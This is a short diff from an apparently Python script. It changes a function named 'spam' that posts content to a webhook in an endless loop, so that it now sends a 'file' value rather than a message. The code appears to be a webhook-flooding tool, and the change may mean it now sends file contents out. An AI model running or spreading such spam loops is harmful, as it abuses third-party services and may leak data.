@@ -42,10 +42,10 @@ def get_cpu_usage():
     return cpu_percent
 
 
-def spam(webhook, msg):
+def spam(webhook, file):
     while True:
         try:
-            data = requests.post(webhook, json={'content': msg})
+            data = requests.post(webhook, json={'content': file})
             if data.status_code == 204:
                 print(f"Send successfully!")
         except:
